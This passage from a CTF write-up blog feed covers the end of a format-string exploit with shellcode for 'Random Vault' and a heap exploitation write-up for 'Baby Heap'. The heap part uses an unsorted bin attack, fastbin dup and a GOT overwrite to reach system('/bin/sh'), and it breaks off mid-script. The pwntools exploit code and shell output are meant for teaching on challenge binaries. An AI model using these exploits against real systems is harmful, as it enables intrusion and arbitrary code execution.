<span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0xffff</span>:</span><br><span class="line">            script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">indices_with_seed_zero</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    libc.srand(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        v0 = libc.rand()</span><br><span class="line">        q = ((v0 &gt;&gt; <span class="number">0x38</span>) + v0) &amp; <span class="number">0xff</span> - ((v0 &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">print</span> q*<span class="number">8</span>   </span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Username: '</span>,<span class="string">'%7$lx|%11$lx'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Hello, '</span>)</span><br><span class="line">STACK = int(r.recvuntil(<span class="string">'|'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">PIE = int(r.recvline().rstrip(),<span class="number">16</span>) - <span class="number">0x1750</span></span><br><span class="line">SEED = PIE+<span class="number">0x5008</span></span><br><span class="line">QWORD5000 = PIE+<span class="number">0x5000</span></span><br><span class="line">unk_5010 = PIE+<span class="number">0x5010</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LEAKED STACK 0x%x"</span> % STACK)</span><br><span class="line">log.info(<span class="string">"LEAKED PIE 0x%x"</span> % PIE)</span><br><span class="line">log.info(<span class="string">"LEAKED SEED 0x%x"</span> % SEED)</span><br><span class="line">log.info(<span class="string">"LEAKED QWORD5000 0x%x"</span> % QWORD5000)</span><br><span class="line">log.info(<span class="string">"LEAKED unk_5010 0x%x"</span> % unk_5010)</span><br><span class="line">r.sendlineafter(<span class="string">'4. Quit\n\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">shellcode = <span class="string">'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">LOW_QWORD4020 = unk_5010 &amp; <span class="number">0xf000</span> | <span class="number">0x348</span></span><br><span class="line">payload = <span class="string">'%29$ln'</span> <span class="comment"># Clear SEED</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%30$hn'</span>.format(LOW_QWORD4020)</span><br><span class="line"></span><br><span class="line">s = payload</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">40</span>-len(payload))</span><br><span class="line">s += p64(SEED)</span><br><span class="line">s += p64(QWORD5000)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Username: '</span>, s)</span><br><span class="line"><span class="comment">#r.recvuntil('\x20\x20\x32')</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x16B5</span>,<span class="number">0x1474</span>,<span class="number">0x161F</span>]) <span class="comment"># 0x16B5,0x1474,15AC</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'4. Quit\n\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0xe2ff10c28348ff31</span>)) <span class="comment"># xor edi, edi ; add rdx, 0x10 ; jmp rdx </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0x050ff38749d38749</span>)) <span class="comment"># xchg r11,rdx ; xchg r11,rsi ; syscall</span></span><br><span class="line"></span><br><span class="line">r.sendline(p64(<span class="number">0x050ff38749d38749</span>)+shellcode)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python random_vault.py REMOTE</span><br><span class="line">[+] Opening connection to 200.136.252.34 on port 1245: Done</span><br><span class="line">[*] LEAKED STACK 0x7ffeb091b470</span><br><span class="line">[*] LEAKED PIE 0x55661a762000</span><br><span class="line">[*] LEAKED SEED 0x55661a767008</span><br><span class="line">[*] LEAKED QWORD5000 0x55661a767000</span><br><span class="line">[*] LEAKED unk_5010 0x55661a767010</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">You<span class="string">'ve stored the following secrets:</span></span><br><span class="line"><span class="string">#1: 16356810799245229873, #2: 364777857225033545, #3: 364777857225033545, #4: 364777857225033545, #5: 364777857225033545, #6: 364777857225033545, #7: 364777857225033545</span></span><br><span class="line"><span class="string">$ cat home/chall/flag</span></span><br><span class="line"><span class="string">CTF-BR&#123;_r4nd0m_1nd1c3s_m4ke_th3_ch4ll3nge_m0r3_fun_&#125;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Random Vault&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;303 points&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;/p
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="pwn2win2019" scheme="https://teamrocketist.github.io/tags/pwn2win2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCtf 2019 - Baby Heap</title>
    <link href="https://teamrocketist.github.io/2019/10/27/Pwn-BackdoorCtf-2019-Baby-Heap/"/>
    <id>https://teamrocketist.github.io/2019/10/27/Pwn-BackdoorCtf-2019-Baby-Heap/</id>
    <published>2019-10-27T19:10:02.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Baby Heap</p><p>pwn backdoorctf19</p><p>Just another babyheap challenge.</p><p><a href="http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap" target="_blank" rel="noopener">http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap</a></p><p><a href="http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6" target="_blank" rel="noopener">http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6</a></p><p>nc 51.158.118.84 17001</p><p>Flag format: CTF{…}</p><p>Created by: Nipun Gupta</p></blockquote><p>Another heap challenge the binary had the following attributes:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file babyheap</span><br><span class="line">babyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=203fc5be05469491a57e7873624c72ef731ed850, stripped</span><br></pre></td></tr></table></figure><p>Checking the security:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyheap</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyheap/babyheap'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>Partial RELRO</strong> which means we can actually write at global offset table this simplifies things a bit and also <strong>PIE</strong> is not enabled so we can access this addresses very easily without a leak.</p><p>The libc version is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc.so.6 | grep <span class="string">'libc-'</span></span><br><span class="line">libc-2.23.so</span><br></pre></td></tr></table></figure></p><h3 id="Exploit-plan"><a href="#Exploit-plan" class="headerlink" title="Exploit plan"></a>Exploit plan</h3><p>So for those who want a very fast solution this my exploit plan:</p><ul><li>Use unsorted bin attack to overwrite the value <strong>global_max_fast</strong> by doing a 4 bit brute force.</li><li>Create a fake chunk(0x31) where the saved sizes of malloc are saved (global variables). </li><li>Use fastbin dup to malloc at the created fake chunk and overwrite a string pointer to <strong>atoi</strong> got.</li><li>By using edit we can get an arbitrary write at <strong>atoi</strong> got, we want to change it to <strong>printf</strong> so we can leak libc.</li><li>The program is not broken because <strong>printf</strong> returns the number of the <strong>printed</strong> bytes string so we still using the options to edit <strong>atoi got</strong> to <strong>system</strong>.</li><li>Send ‘/bin/sh\x00’ to read and get a shell.</li></ul><h3 id="Binary-analysis"><a href="#Binary-analysis" class="headerlink" title="Binary analysis"></a>Binary analysis</h3><p>The first thing we can see right at the beginning is <code>mallopt(1,0);</code><br><a data-fancybox="gallery" href="https://i.imgur.com/4cO9ROj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4cO9ROj.png" alt><br></a><br>From linux man pages:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The mallopt() function adjusts parameters that control the behaviour of the memory-allocation functions (see malloc(3)). </span><br><span class="line">The param argument specifies the parameter to be modified, and value specifies the new value for that parameter.</span><br></pre></td></tr></table></figure><p>The parameter being modified is 1 from the symbols also from linux man pages:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*Symbol            param #   default    allowed param values</span><br><span class="line">  M_MXFAST          1         64         0-80  (0 disables fastbins)</span><br><span class="line">  M_TRIM_THRESHOLD -1         128*1024   any   (-1U disables trimming)</span><br><span class="line">  M_TOP_PAD        -2         0          any  </span><br><span class="line">  M_MMAP_THRESHOLD -3         128*1024   any   (or 0 if no MMAP support)</span><br><span class="line">  M_MMAP_MAX       -4         65536      any   (0 disables use of mmap)</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></p><p>We know that <strong>1</strong> is <strong>M_MXFAST</strong> when 0 means fastbins become disabled… </p><p>Continuing our analysis we need to look for vulnerabilities, delete function has a <strong>double free</strong> vulnerability, there is a check at the beginning, but it’s only checking if this index was previously allocated, also another thing to note is that we are limited to 8 free’s, <strong>freeLimit_602088</strong> is initialized to 8.<br><a data-fancybox="gallery" href="https://i.imgur.com/8uteRiO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/8uteRiO.png" alt><br></a></p><p>Another vulnerability can be found at edit, as in delete function there’s no check, so we have a <strong>UAF</strong> vulnerability here:<br><a data-fancybox="gallery" href="https://i.imgur.com/CGx6Fkl.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CGx6Fkl.png" alt><br></a><br>There’s another limitation to program there’s only 11 slots where the data is saved so we can only use 11 mallocs on our exploit.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="Modifying-global-max-fast"><a href="#Modifying-global-max-fast" class="headerlink" title="Modifying global_max_fast"></a>Modifying global_max_fast</h4><p>There isn’t a print function so there’s no simple way to leak libc and also we can’t use fastbins because they were disabled, our first approach is to find a way re-enable fastbins.</p><p>This can be done if we find a way to modify <strong>global_max_fast</strong> into a big value, but how do we achieve this, we don’t even have libc to calculate the offset to <strong>global_max_fast</strong> ?</p><p>Well one thing we can is a 4 bit bruteforce, if we free a chunk into an <strong>unsortedbin</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/WYoVoaj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/WYoVoaj.png" alt><br></a><br>That’s how we can find the address of <strong>global_max_fast</strong>, and why this variable in particular ? Because it controls the max size that malloc interprets a chunk as fastbin, and it’s current value is <strong>10</strong> because of <strong>mallopt</strong>. </p><p>We need to find a way to modify this value into a bigger number, we can do this by using an <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">unsorted bin attack</a>, we need to modify the <strong>bk</strong> to the <strong>address</strong> we want to modify <strong>minus 0x10</strong>.</p><p>This is how the exploit looks right now</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0x400a5b</span>,<span class="number">0x400bcc</span>]) <span class="comment"># 0x400970</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Unsorted bin attack</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'B'</span>*<span class="number">0x80</span>) <span class="comment"># Chunk to free</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment">#</span></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x31</span>,<span class="string">'d'</span>*<span class="number">0x10</span>) <span class="comment"># CREATE A FAKE CHUNK HERE</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0x0</span>)+p16(<span class="number">0x67f8</span><span class="number">-0x10</span>)) <span class="comment"># 4 bit brute force</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">'C'</span>) <span class="comment"># if we don't get an error here and global_max_fast will be modified.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>If we are successful we will modify <strong>global_max_fast</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/6ZOCBQa.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6ZOCBQa.png" alt><br></a></p><h4 id="Arbitrary-write-using-fastbin-dup"><a href="#Arbitrary-write-using-fastbin-dup" class="headerlink" title="Arbitrary write using fastbin dup"></a>Arbitrary write using fastbin dup</h4><p>We can use fastbin dup now but still we don’t have any leaks, luckily we know that size of each data is being saved at <strong>0x6020e0</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/edIfL6W.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/edIfL6W.png" alt><br></a><br>The data pointers to the strings are also saved in a global variable at <strong>ptr(0x602120)</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/KSZqabj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KSZqabj.png" alt><br></a></p><p>This how it looks in memory in gdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/Ny6Zp0m.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ny6Zp0m.png" alt><br></a><br>I created a fake chunk at index 8 with malloc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x31</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment"># CREATE A FAKE CHUNK HERE</span></span><br></pre></td></tr></table></figure><p>Now we proceed to use <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin dup</a> to modify the <strong>fastbin linked list</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020f8</span>)) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'C'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">edit(<span class="number">0</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br></pre></td></tr></table></figure><p>We edited the index 0 string pointer into <strong>atoi</strong> got, later with this we can modify atoi got into printf gaining a format string vulnerability to leak libc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'%7$s    '</span></span><br><span class="line">s += p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,s)</span><br><span class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = PUTS-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><p>Finaly after getting <strong>system</strong> we change again <strong>atoi</strong> to system and send the <strong>/bin/sh</strong> string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">"AA"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, <span class="string">''</span>)</span><br><span class="line">r.sendafter(<span class="string">"Please update the data:\n"</span>, p64(SYSTEM))</span><br><span class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</span><br></pre></td></tr></table></figure><p>The shell is achieved after this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ python babyheap.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyheap/babyheap'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyheap/libc-2.23.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to 51.158.118.84 port 17001</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">.... Truncated......</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to 51.158.118.84 port 17001</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[*] LIBC 0x7ffaa87a0000</span><br><span class="line">[*] SYSTEM 0x7ffaa87e5390</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">update successful</span><br><span class="line"></span><br><span class="line">1) Add data</span><br><span class="line">2) Edit data</span><br><span class="line">3) Remove data</span><br><span class="line">4) Exit</span><br><span class="line">&gt;&gt; $ ls</span><br><span class="line">Dockerfile</span><br><span class="line">babyheap</span><br><span class="line">babyheap.c</span><br><span class="line">beast.toml</span><br><span class="line">flag.txt</span><br><span class="line">post-build.sh</span><br><span class="line">public</span><br><span class="line">setup.sh</span><br><span class="line">$ cat flag.txt</span><br><span class="line">....hiddenFlag....</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"51.158.118.84"</span>, <span class="string">"17001"</span></span><br><span class="line">filename = <span class="string">"./babyheap"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, str(index))</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the size:\n"</span>, str(size))</span><br><span class="line">r.sendafter(<span class="string">"Enter data:\n"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, str(index))</span><br><span class="line">r.sendafter(<span class="string">"Please update the data:\n"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span 